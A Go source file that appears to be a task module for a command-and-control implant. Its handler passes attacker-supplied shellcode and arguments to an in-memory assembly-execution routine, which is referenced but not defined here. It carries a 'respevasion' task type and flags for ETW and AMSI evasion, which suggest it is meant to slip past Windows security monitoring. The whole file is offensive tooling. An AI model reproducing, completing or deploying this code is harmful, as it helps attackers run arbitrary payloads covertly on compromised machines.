package main

/*
#include <stdlib.h>
*/
import "C"

import (
	"errors"
	"fmt"
)

var etwEvaded bool

var amsiEvaded bool

type Task struct {
	TaskId     string `json:"taskid"`
    Shellcode   []byte `json:"shellcode"`
	Args       []string `json:"args"`

	// General Purpose
	status   string
	tasktype string

}

func InitialiseTask(task *Task) error {
	task.tasktype = "respevasion"
	if task.Args == nil {
		task.Args = []string{""}
	}
	return nil
}

func TaskHandler(task *Task) (stdout []byte, err error) {
    if len(task.Args) < 2 {
        s := []byte("Error in args number")
        return s, errors.New(string(s))
    }
	stdout, _, err = executeAssembly(task.Shellcode, task.Args[0], task.Args[1])
    if err != nil {
        fmt.Println("Error Occured --> ", err.Error())
        return nil, err
    }
	task.status = "completed"
	return stdout, err
}

// Tell us if task if done (failed or completed)
func IsTaskDone(task Task) bool {
	if task.status == "completed" || task.status == "failed" {
		return true
	}
	return false
}

// Return Task Status
func ComputeTaskStatus(task Task) string {
	return task.status
}

// Return Task Type
func ComputeTaskType(task Task) string {
	return task.tasktype
}
